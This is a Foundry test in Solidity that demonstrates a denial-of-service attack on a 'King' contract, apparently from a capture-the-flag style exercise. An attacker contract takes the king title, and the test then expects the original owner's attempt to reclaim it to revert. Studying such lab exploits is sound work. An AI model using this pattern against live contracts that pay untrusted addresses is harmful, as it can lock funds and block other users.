// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {King} from "../src/King.sol";
import {AttackerContract} from "../src/AttackerContract.sol";

contract KingTest is Test {
    King king;
    address alice;
    AttackerContract attackerContract;

    function setUp() public {
        alice = makeAddr("alice");
        vm.prank(alice);
        king = new King();
        attackerContract = new AttackerContract();
        vm.deal(address(attackerContract), 2 ether);
    }

    function test_DenialOfService() public {
        console.log("Current king address (Alice): ", king._king());
        console.log("---Attacker claiming king status via AttackerContract---");
        vm.prank(address(attackerContract));
        (bool success, ) = address(king).call{value: 1 ether}("");
        console.log("Current king address (Attacker contract address): ", king._king());
        console.log("---Alice trying to reclaim king status---");
        console.log("ERROR");
        vm.prank(alice);
        vm.expectRevert();
        (bool success2, ) = address(king).call{value: 1 ether}("");
    }

}
